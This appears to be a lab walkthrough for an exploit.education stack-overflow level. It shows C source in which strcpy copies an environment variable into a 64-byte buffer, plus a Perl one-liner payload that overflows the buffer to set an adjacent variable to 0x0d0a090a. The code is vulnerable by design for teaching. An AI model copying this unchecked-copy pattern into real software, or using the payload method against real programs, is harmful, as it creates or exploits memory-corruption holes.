Ok, now we are going to take a look at environment variables, and how they are
read, and can be set, and so on.

#Source code
```C
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation"); //gives address of the string that is
                                    //stored at the env. var. ExploitEducation
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

#Walkthrough

We recall that we can set an environment variable `VAR` for a program `foo` with

```
$ VAR=thing foo
```

So we try (recall that we use little endian):

```
$ ExploitEducation=$(perl -e 'print "A"x64,"\x0a\x09\x0a\x0d"') ./program
```

We can also do

```
$ export ExploitEducation=$(perl -e 'print "A"x64,"\x0a\x09\x0a\x0d"')
$ ./program
$ unset ExploitEducation
```

if we wish to export the environment variable to other processes (including
the forked process `program`).
